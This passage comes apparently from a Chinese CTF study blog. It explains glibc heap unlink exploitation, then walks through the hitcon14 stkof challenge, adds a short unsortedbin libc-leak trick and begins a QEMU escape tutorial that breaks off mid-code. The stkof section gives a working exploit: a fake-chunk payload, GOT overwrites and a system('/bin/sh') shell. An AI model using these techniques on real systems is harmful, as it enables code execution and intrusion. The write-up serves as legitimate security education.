id=\"unlink\">UNLINK</span></h1><h2><span id=\"unlink大致概念\">unlink大致概念</span></h2><p>​        就是将free chunk从双向循环链表中解链的过程，具体触发这个过程的操作比较常见的有与当前物理相邻的chunk合并的过程等。因为是双向链表，自然已经超出了fastbin的范围，一般申请的chunk也要大于0x60了。</p>\n<p>​        在ptmalloc中unlink的代码简化来看就是：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">#小写的指fd和bk位，大写指前/后chunk bp</span><br><span class=\"line\">FD=P-&gt;fd #后一个chunk bp = 当前chunk的fd，</span><br><span class=\"line\">BK=P-&gt;bk# #前一个chunk bp = 当前chunk的bk，相当于赋值。</span><br><span class=\"line\">  </span><br><span class=\"line\">FD-&gt;bk =P-&gt;bk #后一个chunk的bk位 = 当前chunk的bk，也就是后一个chunk的bk等于前一个chunk的 bp</span><br><span class=\"line\">BK-&gt;fd = P-&gt;fd #前一个chunk的fd = 后一个chunk的bp</span><br></pre></td></tr></table></figure>\n<p>​    </p>\n<p>​    （在这里我一直忽略一个很重要的点，就是<code>p-&gt;fd</code>是一个指针，保存了<code>FD_prevsize</code>的地址，bk同理，于是在unlink时，<code>FD-&gt;bk=BK</code>，其中    <code>FD-&gt;bk</code>的地址是<code>p-&gt;fd+12</code>，但是实际unlink需要的是将这个地址的内容替换为BK，所以应该是<code>*(p-&gt;fd + 12)=BK</code>而不是是<code>(p-&gt;fd + 12)=BK</code></p>\n<p>​        所以在比较远古的版本中，由于glibc没有给unlink做什么检查，导致我们那可以伪造unlink时与前/后连接的chunk，导致申请到伪造的chunk。</p>\n<p>​        </p>\n<h3><span id=\"古早的unlink利用\">古早的unlink利用</span></h3><p>​        ps：有一些内容是参照我之前第一次学习时做的笔记。</p>\n<p>​        刚才说到，unlink的操作是将前一个chunk的bk指针指向后一个chunk，后一个chunk的fd指针指向前一个chunk，我们可以选择通过控制后一个chunk的指针来篡改本来要连接的对象。</p>\n<p>​        举一个例子，如果有两个物理地址连续的small chunk0和small chunk1（这里chunk size必须要大于fastbin，因为fastbin chunk就只是将chunk放进fastbin链表中管理，并且为了效率，每个chunk的<code>prev_inuse</code>位都没有修改，在链表中也不会进行合并），前一个chunk0是allocated，后一个chunk1是free，这时候如果我们释放chunk0，由于两个chunk都是free状态，所以ptmalloc判断两个chunk需要合并，于是首先需要把chunk1从双向循环链表中拿出来与chunk0合并，合并之后再放回去。</p>\n<p>​        这时我篡改chunk0的bk指针指向一个我们希望的<code>target_addr</code>的bp，再将<code>target_addr+8</code>改成chunk0的bp。这样在unlink的时候，实际连接的就是chunk0与<code>target_addr</code>，chunk1就被忽略掉了。</p>\n<p>​        但是在实际的利用中，这样需要修改两个chunk。或者说两个内存块，未免有些麻烦，注意到unlink的操作之前是有一个类似“赋值”的操作的，这里是不是也能够作为攻击的切入点？</p>\n<p>​        <code>FD=P-&gt;fd;BK=P-&gt;bk;FD-&gt;bk = BK;BK-&gt;fd = FD</code>，其实前面的两步虽然不是实际的unlink的操作，但是也十足关键，这两个操作判定了前后chunk的bp，可以说后面unlink操作都是基于前面两步指定的指针来进行的，所以我们只需要把目光投向当前chunk的fd和bk位，修改它们，就相当于同时修改了前一个chunk和<code>target chunk</code>。</p>\n<p>​        那么还是之前举的例子，我们不修改chunk0或target chunk，而是修改chunk1本身。</p>\n<p>​        我们最终的目的还是希望能够通过一个libc函数+参数的形式，执行某些特定的函数。所以我们希望利用unlink修改函数的got表。</p>\n<p>​        比如说为了show某些地址，改<code>free got</code>为<code>puts got</code>，为了getshell，改<code>atoi got</code>为<code>system got</code>。</p>\n<p>​        要修改got表，一个通用的步骤，是先在chunk content上填上got addr，然后将chunk content作为一个指针，分配chunk content指向的内存块，也就是got，再利用edit或者其他东西修改这个内容。</p>\n<p>​        比如我们首先需要伪造一个show的功能，就需要将某个函数的got替换成puts（已经包含的任意输出函数，哦，其实常见的只有puts和printf），比如说经典受害人free（）。</p>\n<p>​        那么又该如何实现这样的效果？</p>\n<p>​        我们可以在<code>FD=P-&gt;fd</code>这一步时将fd赋值为某个<code>got addr -12</code>（这是一个got表值的地址）。然后在<code>BK=P-&gt;bk</code>时给bk赋一个值，比如说<code>system got</code>（这是一个got表值），然后unlink时，<code>FD-&gt;bk = BK</code>，会先找到<code>FD</code>的地址，也就是<code>got addr - 12</code>，然后找到<code>FD</code>的<code>bk</code>指针，也就是<code>got addr  -12 + 12</code>（32位），再解引用，使得找到的<code>FD-&gt;bk</code>的地址对应的内存块的值为<code>BK</code>，也就是我们刚刚篡改过的got的值，这样就成功了。用数据结构的语言描述相对比较抽象，下面具体一点讲在题目中的利用思路。</p>\n<h2><span id=\"unlink题目利用思路\">unlink题目利用思路</span></h2><p>​        虽然解题的细节因题而异，但是思路万变不离其宗。</p>\n<p>​        之间也总结过，就是像这类改指针的题目，无非就是两层指针关系。地址A指向地址B，地址B指向地址C，通常我们为了改地址C的内容，就需要通过地址A修改地址B。</p>\n<p>​        而在通常的堆题中，结构体中的指针就是这个地址B，我们利用伪造的指针来修改地址B，使其指向目标地址，在edit或者其他操作的时候，将地址B指向的区域修改。而一般解题的关键，就是如何控制地址A和地址B的关系。</p>\n<h4><span id=\"无检测\">无检测</span></h4><p>​        在unlink中，我们选择构造一个fake free chunk（这个fake chunk自己的位置并不是太重要），接着给这个fake free chunk填上假的fd和bk。先不用管，free掉前一个chunk，由于前一个chunk和我们刚刚构造的fake chunk都被判定为free，所以需要合并，此时就需要将fake chunk从假的双向循环链表中unlink，进行的操作就是，前一个chunk ptr = fake chunk fd，后一个chunk ptr = fake chunk bk，前一个chunk的bk，也就是我们刚刚篡改的fake chunk fd + 0x18 = 后一个chunk ptr，也就是fake chunk bk。</p>\n<p>​        因此这个假的fd和bk就是整个unlink的关键。</p>\n<p>​        我们想要实现比如got表的修改，可以将fake fd和fake bk分别填为got addr和got值，unlink成功的话就能实现<code>*(got addr ) = got</code></p>\n<h4><span id=\"有检测\">有检测</span></h4><h2><span id=\"例子\">例子</span></h2><h3><span id=\"stkof\">stkof</span></h3><h4><span id=\"检查文件\">检查文件：</span></h4><p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-10%20%E4%B8%8B%E5%8D%884.03.13.png\" alt=\"截屏2021-12-10 下午4.03.13\">    </p>\n<p>​            64位动态链接文件，没开PIE，问题不大。got表可写，可以尝试改一改。</p>\n<h4><span id=\"逆向\">逆向</span></h4><h5><span id=\"edit\">edit</span></h5><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">ptr = (&amp;::s)[v2];</span><br><span class=\"line\"><span class=\"keyword\">for</span> ( i = fread(ptr, <span class=\"number\">1uLL</span>, size, <span class=\"built_in\">stdin</span>); i &gt; <span class=\"number\">0</span>; i = fread(ptr, <span class=\"number\">1uLL</span>, size, <span class=\"built_in\">stdin</span>) )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  ptr += i;</span><br><span class=\"line\">  size -= i;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​        这里因为输入的size的大小是任意的，就意味着我们能够向chunk中读入无限制的数据，导致堆溢出。</p>\n<h5><span id=\"add\">add</span></h5><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">(&amp;::s)[++head] = chunk_ptr;</span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d\\n&quot;</span>, (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span>)head);</span><br></pre></td></tr></table></figure>\n<p>​        这里会将content的指针保存在heap结构体中。也可以理解为heap结构体中只有一个ptr字段。</p>\n<h5><span id=\"free\">free</span></h5><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">free</span>((&amp;::s)[idx]);</span><br><span class=\"line\">(&amp;::s)[idx] = <span class=\"number\">0LL</span>;</span><br></pre></td></tr></table></figure>\n<p>​        这里虽然将结构体中保存的ptr置零，但是chunk ptr本身没有被置0，还是存在可以利用的uaf。</p>\n<h5><span id=\"put_todo\">put_TODO?</span></h5><p>​        还有这个不知道是干嘛的函数，我觉得唯一可能的意义就是调用puts，拿来改点表啥的。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ( <span class=\"built_in\">strlen</span>((&amp;::s)[idx]) &lt;= <span class=\"number\">3</span> )</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;//TODO&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;...&quot;</span>);</span><br></pre></td></tr></table></figure>\n<h4><span id=\"漏洞利用思路\">漏洞利用思路</span></h4><h5><span id=\"大致的疑思\">大致的疑思</span></h5><p>​        整理一下。还是菜单题，增删改，没有查。改没有限制输入字符的长度，存在堆溢出，查的话需要我们自己改got表然后泄露数据。</p>\n<p>​        libc还是2.23，没有对于unlink的检测，因此相对来说其实不难。</p>\n<p>​        在分析之前，稍微想一下如何确定这道题的利用方式是unlink。看到UAF漏洞，其实对应的利用方式有很多，比较常见的就有unlink和fastbinattack，但是为什么是unlink而不利用fastbin呢？</p>\n<p>​        如果这是一个fastbin attack，那么估计也就是house of spirit的题型。我们需要在got addr附近伪造一个fake chunk，先不管target addr地址的合法性，我们直接考虑如何覆盖fastbin的fd，稍微想一想就发现不实际，因为我们倘若要完成整个步骤，目标需要修改的ptr必须是结构体中保存的ptr，而这个指针在free时已经被置0了，因此不可能利用fastbin attack。于是需要反过来说明unlink的合理性。unlink可以被利用的关键在于chunk的伪造是在free之前的，首先在next chunk上布置好fake chunk，然后free，就已经完成了利用，不用再考虑其他什么指针操作了。</p>\n<p>​        回到题目本身，首先，因为程序没有设置取消缓冲区，所以在我们输入东西，实际分配chunk之前，程序还会申请一堆chunk用于缓冲，所以为了不影响调试，需要先申请一个大chunk来把这些缓冲区申请了。</p>\n<p>​        因为有uaf，并且可以改got，所以这道题的思路大致是通过unlink改got表然后调用<code>system(&quot;/bin/sh&quot;)</code>来getshell。对于libc的leak，因为没有show函数，所以需要先利用改got表的方式伪造一个<code>puts()</code>。</p>\n<h5><span id=\"具体思路\">具体思路</span></h5><p>​        在构造任意地址写之前，可以先尝试leak libc。</p>\n<p>​        第一步需要将<code>free()</code>的got表修改为<code>puts()</code>的got表，这一步我们需要在<code>free got addr</code>处填<code>入puts plt</code>。</p>\n<p>​        在前面介绍unlink利用时，举的例子就是利用unlink改表，那么这种方式能不能用在这道题上呢？</p>\n<p>​        先申请三个chunk，第一个chunk用来填缓冲区，意义不大，第二个chunk用来触发unlink，第三个chunk用来被修改fd和bk。首先非常自然地想到，将chunk3的fd改为free got addr - 0x18，bk改为puts plt。</p>\n<p>​        稍微往后想一下，这样unlink了之后。p-&gt;bk就被完全破坏了，我们只是获得了一个puts函数，但是我们还需要将atoi gots改为system，这样做就无法故技重施了，未免有些破釜沉舟。</p>\n<p>​        不妨使用一些更加精妙的技巧。我们没有必要更改chunk的ptr本身，由于heap结构体中保存了指向chunk content的指针，所以如果我们能伪造一个fake chunk到heap结构体处，就能修改每个heap的content指针，也就是对应的chunk ptr为不同函数的got表，这样当我们修改chunk content时，就相当于修改了函数的got表内容了。</p>\n<p>​        所以目前的问题是如何伪造一个fake chunk到heap结构体处。</p>\n<p>​        </p>\n<p>​        思路就是利用堆溢出漏洞，将chunk2的fd修改为heap2 - 0x18，这样当unlink时，FD= p -&gt;fd  = heap2 - 0x18，相当于chunk2前一个chunk是在heap2 - 0x18的位置，然后FD-&gt;bk = BK，也就是heap2 = BK。这里有两种理解的方式，一种是fake chunk的ptr位于heap2的位置。所以我们能够编辑chunk2（实则是编辑fake chunk）来修改heap结构体储存的chunk ptr。</p>\n<p>​        这样我们就可以修改heap[0]为free got，1为puts got，2为atoi got，然后edit chunk0，将内容编辑为puts的plt表（因为此时chunk0的ptr指针已经被修改为free的got表地址了）</p>\n<p>​        这样我们就获得了puts函数。这时我们puts（1），就能获得chunk1的实际ptr地址，注意这时候这个实际ptr就是puts的got表值，这样我们就可以进行rop获得system的真实地址了。</p>\n<p>​        然后利用类似的步骤将atoi的got表覆盖为system的got表，最后只要发送<code>&quot;/bin/sh&quot;</code>就能getshell。</p>\n<h4><span id=\"实际利用\">实际利用</span></h4><p>​        首先连续申请三次个chunk。chunk大小至少是small。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">add(<span class=\"number\">0x100</span>)<span class=\"comment\">#1 填充缓冲区</span></span><br><span class=\"line\">add(<span class=\"number\">0x30</span>)<span class=\"comment\">#2 free它来触发unlink</span></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>)<span class=\"comment\">#3 构造fake chunk，完成利用。</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-11%20%E4%B8%8B%E5%8D%883.49.08.png\" alt=\"截屏2021-12-11 下午3.49.08\"></p>\n<p>​        利用edit功能，将chunk2伪造成一个free fake chunk。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#forge fake chunk</span></span><br><span class=\"line\">payload = p64(<span class=\"number\">0</span>)  <span class=\"comment\">#prev_size</span></span><br><span class=\"line\">payload += p64(<span class=\"number\">0x20</span>)  <span class=\"comment\">#size,fake free bin</span></span><br><span class=\"line\">payload += p64(head + <span class=\"number\">16</span> - <span class=\"number\">0x18</span>)  <span class=\"comment\">#fake chunk fd</span></span><br><span class=\"line\">payload += p64(head + <span class=\"number\">16</span> - <span class=\"number\">0x10</span>)  <span class=\"comment\">#fake chunk bk</span></span><br><span class=\"line\">payload += p64(<span class=\"number\">0x20</span>)  <span class=\"comment\"># next chunk&#x27;s prev_size to bypass the check</span></span><br><span class=\"line\">payload = payload.ljust(<span class=\"number\">0x30</span>, <span class=\"string\">b&#x27;a&#x27;</span>)<span class=\"comment\"># padding</span></span><br><span class=\"line\">payload += p64(<span class=\"number\">0x30</span>)<span class=\"comment\"># Next_chunk&#x27;s prev_size field. Make it believe that prev chunk is free</span></span><br><span class=\"line\">payload += p64(<span class=\"number\">0x90</span>)<span class=\"comment\"># Next_chunk&#x27;s size field</span></span><br><span class=\"line\">edit(<span class=\"number\">2</span>,<span class=\"number\">0x40</span>, payload)</span><br></pre></td></tr></table></figure>\n<p>​    </p>\n<p>​        这一段最关键的就是这两句，其他都是为了绕过检测的一些小细节。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">payload += p64(head + <span class=\"number\">16</span> - <span class=\"number\">0x18</span>)  <span class=\"comment\">#fd</span></span><br><span class=\"line\">payload += p64(head + <span class=\"number\">16</span> - <span class=\"number\">0x10</span>)  <span class=\"comment\">#bk</span></span><br></pre></td></tr></table></figure>\n<p>​        当unlink时，操作如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">FD -&gt; bk = BK =&gt; head + <span class=\"number\">16</span> = head + <span class=\"number\">16</span> - <span class=\"number\">0x10</span></span><br><span class=\"line\"></span><br><span class=\"line\">BK -&gt; fd = FD =&gt; head + <span class=\"number\">16</span> -<span class=\"number\">0x10</span> + <span class=\"number\">0x10</span> =*（ head + <span class=\"number\">16</span>） = head +<span class=\"number\">16</span> -<span class=\"number\">0x18</span></span><br></pre></td></tr></table></figure>\n<p>​        其实就是在head +16（这是一个地址）处填入了head +16 -0x18的内容。</p>\n<p>​        然后非常有趣的是（也是精心构造的结果），head + 16指向的内容正好就是chunk2 content ptr，也就是相当于这个操作使得chunk2 content ptr被修改为了head+16-0x18，所以当我们edit chunk2，我们的输入会在head+16-0x18指向的地方，也就是head-0x8这个地址。</p>\n<p>​        所以我们就可以随便覆盖head了。先用八个字节填充到head地址上，再将每个head指针都改为需要的got的地址，这样当我们edit对应的heap的时候，就会在对应的got地址上写入数据。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">payload = <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">8</span> + p64(free_got_addr)<span class=\"comment\">#head0 to free got addr</span></span><br><span class=\"line\">payload += p64(puts_got_addr)<span class=\"comment\">#head1 to puts got addr</span></span><br><span class=\"line\">payload += p64(atoi_got_addr)<span class=\"comment\">#head2 to atoi got addr</span></span><br><span class=\"line\">edit(<span class=\"number\">2</span>,<span class=\"built_in\">len</span>(payload),payload)</span><br></pre></td></tr></table></figure>\n<p>​        这时候我们编辑head0，在free got addr处写入puts的plt，这样free一个heap就相当于打印，正好heap被我们改成了got表地址，就相当于打印got表了。最后我们可以用相似的方法将<code>atoi(    )</code>的got改为system地址，最后getshell。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">edit(<span class=\"number\">0</span>,<span class=\"number\">8</span>,p64(puts_plt))</span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\">puts_addr = u64(p.recv(<span class=\"number\">8</span>))</span><br><span class=\"line\">log.success(<span class=\"string\">&quot;puts_addr =&gt; &#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(puts_addr)))</span><br><span class=\"line\">system_addr = puts_addr - (libc.symbols[<span class=\"string\">&#x27;puts&#x27;</span>] - libc.symbols[<span class=\"string\">&#x27;system&#x27;</span>])</span><br><span class=\"line\">log.success(<span class=\"string\">&quot;system_addr =&gt; &#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(system_addr)))</span><br><span class=\"line\"></span><br><span class=\"line\">edit(<span class=\"number\">2</span>,<span class=\"number\">8</span>,p64(system_addr))</span><br><span class=\"line\">p.send(<span class=\"string\">&quot;/bin/sh&quot;</span>)</span><br></pre></td></tr></table></figure>\n<p>​        </p>\n<p>​        </p>\n<p>​        </p>\n<p>​    </p>\n<h1><span id=\"参考\">参考</span></h1><p><a href=\"https://guyinatuxedo.github.io/30-unlink/hitcon14_stkof/index.html\">hitcon14_stkof</a></p>\n","categories":["Binary_security"],"tags":["HEAP - Unlink"]},{"title":"unsortedbinleak","url":"/2021/12/11/heap_unsortedbin%20leak/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>​    一个简单的trick。</p>\n<p>​        并且在trick就是tcache，接下来就是刷题熟练，最后再简单学习一下largin bin和small bin的利用。</p>\n<p>​        unsortedbin  由双向循环链表管理，表头为<code>main_arena</code>，所以表末尾的chunk的fd会指回<code>main_arena</code>，这样我们就获得了<code>main_arena</code>结构体内部的的地址，通过调试我们就能得到<code>main_arena</code>的真正的地址，并且<code>main_arena</code>与libc基地址有固定偏移，就能四舍五入获得libc的基地址。</p>\n<p>​        如何泄露这个fd呢？</p>\n<p>​        一般情况下，可以利用UAF，show出 unsorted chunk的<code>fd</code>。</p>\n<p>​        当bin中只有一个chunk时，由于bin中一般都是干净的，该bin的<code>fd</code>和<code>bk</code>都会指向<code>main_arena</code>中</p>\n<p>​        那么如何得到<code>main_arena</code>与libc的固定偏移呢？</p>\n<p>​        有两种方式：</p>\n<p>​    1:用IDA找到.so文件的 <code>malloc_trim</code> 函数，就可以获得偏移。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span></span><br><span class=\"line\">__malloc_trim (<span class=\"keyword\">size_t</span> s)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> result = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (__malloc_initialized &lt; <span class=\"number\">0</span>)</span><br><span class=\"line\">    ptmalloc_init ();</span><br><span class=\"line\"></span><br><span class=\"line\">  mstate ar_ptr = &amp;main_arena;<span class=\"comment\">//&lt;=对main_arena进行了访问，用伪代码看到的结果就是main_arena和libc的固定偏移。</span></span><br><span class=\"line\">  <span class=\"keyword\">do</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      __libc_lock_lock (ar_ptr-&gt;mutex);</span><br><span class=\"line\">      result |= mtrim (ar_ptr, s);</span><br><span class=\"line\">      __libc_lock_unlock (ar_ptr-&gt;mutex</span><br><span class=\"line\"></span><br><span class=\"line\">      ar_ptr = ar_ptr-&gt;next;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  <span class=\"keyword\">while</span> (ar_ptr != &amp;main_arena);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​        </p>\n<p>2:通过<code>malloc_hook</code>算出。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">main_arena_offset = ELF(<span class=\"string\">&quot;libc.so.6&quot;</span>).symbols[<span class=\"string\">&quot;__malloc_hook&quot;</span>] + <span class=\"number\">0x10</span></span><br></pre></td></tr></table></figure>\n","categories":["Binary_security"],"tags":["HEAP - Unsortedbin"]},{"title":"qemu逃逸学习","url":"/2022/07/25/kernel_qemu%E5%AD%A6%E4%B9%A0/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-kvmerPOu\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"1844479015\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div>  \n<p>因为一些奇怪的原因，开始学一下qemu。</p>\n<h1><span id=\"环境准备\">环境准备</span></h1><p>busybox</p>\n<h1><span id=\"基础知识\">基础知识</span></h1><h2><span id=\"内存结构\">内存结构</span></h2><p>qemu使用mmap出0x40000000大小的内存作为虚拟机的物理内存，在qemu存在两个转换层，分别是：</p>\n<p>用户地址-&gt;物理地址</p>\n<p>物理地址-&gt;qemu虚拟地址</p>\n<p>具体转换如下：</p>\n<p><code>/proc/$pid/pagemap</code>中储存了当前进程的页表，使得用户空间可以根据页表找到每个虚拟页面映射的物理帧。</p>\n<p>通过读取这个页表，就能够实现从用户虚拟地址到物理地址的转换。</p>\n<p>例如host为qemu进程分配了0x40000000的虚拟内存空间，地址为<code>0x7fe37fe00000</code>，通过读取<code>/proc/$pid/pagemap</code>，将qemu中某个程序的虚拟地址转换为物理地址，返回一个偏移，偏移加上qemu进程的基址则是该程序的真实地址。</p>\n<h2><span id=\"pci\">pci</span></h2><p>符合 PCI 总线标准的设备就被称为 PCI 设备。</p>\n<p>pci设备通过pci配置空间来指定关于pci设备的特定信息，其中BAR寄存器指定了设备所需要的内存和io空间的大小（也可以用来存放设备寄存器的地址）。pci设备可以申请两类地址空间，包括<code>memory space(MMIO)</code>和<code>I/O space(PMIO)</code></p>\n<h3><span id=\"mmio\">MMIO</span></h3><p>应用得最为广泛的一种io方法，它使用相同的地址总线来处理内存和io设备</p>\n<ul>\n<li>Bit 0：Region Type，总是为 0，用于区分此类型为 Memory</li>\n<li>Bits 2-1：Locatable，为 0 时表示采用 32 位地址，为 2 时表示采用 64 位地址，为 1 时表示区间大小小于 1MB</li>\n<li>Bit 3：Prefetchable，为 0 时表示关闭预取，为 1 时表示开启预取</li>\n<li>Bits 31-4：Base Address，以 16 字节对齐基址</li>\n</ul>\n<p><img src=\"https://p1.ssl.qhimg.com/t014a4e49a0207d55ec.png\" alt=\"img\"></p>\n<p>当cpu访问某个内存地址时，该地址可以是物理内存或io设备的内存，用于访问内存的cpu指令也可来访问io设备。</p>\n<h3><span id=\"pmio\">PMIO</span></h3><h4><span id=\"io设备与物理内存相互有独立的地址空间\">io设备与物理内存相互有独立的地址空间。</span></h4><ul>\n<li>Bit 0：Region Type，总是为 1，用于区分此类型为 I/O</li>\n<li>Bit 1：Reserved</li>\n<li>Bits 31-2：Base Address，以 4 字节对齐基址</li>\n</ul>\n<p><img src=\"https://p3.ssl.qhimg.com/t01705f97e43a0cc0b5.png\" alt=\"img\"></p>\n<p>cpu需要通过特殊的指令来访问io设备，这些指令可以读/写1,2,4个字节（例如：<code>outb</code>, <code>outw</code>, <code>outl</code>）到IO设备上。</p>\n<h2><span id=\"qemu中查看pci设备\">qemu中查看pci设备</span></h2><p><code>lspci</code>命令用于显示当前主机的所有PCI总线信息，以及所有已连接的PCI设备信息。</p>\n<h1><span id=\"例题\">例题</span></h1><h2><span id=\"blizzard-ctf-2017-strng\">Blizzard CTF 2017 Strng</span></h2><p>启动脚本</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">./qemu-system-x86_64 \\</span><br><span class=\"line\">    -m 1G \\</span><br><span class=\"line\">    -device strng \\</span><br><span class=\"line\">    -hda my-disk.img \\</span><br><span class=\"line\">    -hdb my-seed.img \\</span><br><span class=\"line\">    -nographic \\</span><br><span class=\"line\">    -L pc-bios/ \\</span><br><span class=\"line\">    -enable-kvm \\</span><br><span class=\"line\">    -device e1000,netdev=net0 \\</span><br><span class=\"line\">    -netdev user,id=net0,hostfwd=tcp::5555-:22</span><br></pre></td></tr></table></figure>\n<p>ps:我的环境中kvm有bug，一直报错。直接把<code>-enable-kvm</code>这一条去掉反而可以运行，听说是会大幅降低性能，但是实际测试感觉也没有什么很大问题。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-07-27%20%E4%B8%8B%E5%8D%884.29.31.png\" alt=\"截屏2022-07-27 下午4.29.31\"></p>\n<p>输入账户和密码：ubuntu，passw0rd就能登陆。</p>\n<p>然后是对<code>qemu-system-x86_64</code>逆向。</p>\n<p>首先在ida中搜索<code>strng</code>函数.</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-07-27%20%E4%B8%8B%E5%8D%882.57.51.png\" alt=\"截屏2022-07-27 下午2.57.51\"></p>\n<p>将k的类型设置为<code>PCIDeviceClass *</code></p>\n<p>​    </p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-07-27%20%E4%B8%8B%E5%8D%883.49.45.png\" alt=\"截屏2022-07-27 下午3.49.45\"></p>\n<p>能看到设备号等信息。</p>\n<p>​    <code>pci_strng_realize</code>    注册了MMIO和PMIO空间。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> __fastcall <span class=\"title\">pci_strng_realize</span><span class=\"params\">(PCIDevice_0 *pdev, Error_0 **errp)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  memory_region_init_io(</span><br><span class=\"line\">    (MemoryRegion_0 *)&amp;pdev[<span class=\"number\">1</span>],</span><br><span class=\"line\">    &amp;pdev-&gt;qdev.parent_obj,</span><br><span class=\"line\">    &amp;strng_mmio_ops,</span><br><span class=\"line\">    pdev,</span><br><span class=\"line\">    <span class=\"string\">&quot;strng-mmio&quot;</span>,</span><br><span class=\"line\">    <span class=\"number\">0x100</span>uLL);</span><br><span class=\"line\">  pci_register_bar(pdev, <span class=\"number\">0</span>, <span class=\"number\">0</span>, (MemoryRegion_0 *)&amp;pdev[<span class=\"number\">1</span>]);</span><br><span class=\"line\">  memory_region_init_io(</span><br><span class=\"line\">    (MemoryRegion_0 *)&amp;pdev[<span class=\"number\">1</span>].io_regions[<span class=\"number\">0</span>].size,</span><br><span class=\"line\">    &amp;pdev-&gt;qdev.parent_obj,</span><br><span class=\"line\">    &amp;strng_pmio_ops,</span><br><span class=\"line\">    pdev,</span><br><span class=\"line\">    <span class=\"string\">&quot;strng-pmio&quot;</span>,</span><br><span class=\"line\">    <span class=\"number\">8uLL</span>);</span><br><span class=\"line\">  pci_register_bar(pdev, <span class=\"number\">1</span>, <span class=\"number\">1u</span>, (MemoryRegion_0 *)&amp;pdev[<span class=\"number\">1</span>].io_regions[<span class=\"number\">0</span>].size);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><code>strng_mmio_ops</code>访问了mmio对应的<code>strng_mmio_read</code>以及<code>strng_mmio_write</code>，；<code>strng_pmio_ops</code>中有访问pmio对应的<code>strng_pmio_read</code>以及<code>strng_pmio_write</code>。</p>\n<h4><span id=\"strng_mmio_read\">strng_mmio_read</span></h4><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">uint64_t</span> __fastcall <span class=\"title\">strng_mmio_read</span><span class=\"params\">(<span class=\"keyword\">void</span> *opaque, hwaddr addr, <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> size)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">uint64_t</span> result; <span class=\"comment\">// rax</span></span><br><span class=\"line\"></span><br><span class=\"line\">  result = <span class=\"number\">-1LL</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( size == <span class=\"number\">4</span> &amp;&amp; (addr &amp; <span class=\"number\">3</span>) == <span class=\"number\">0</span> )</span><br><span class=\"line\">    <span 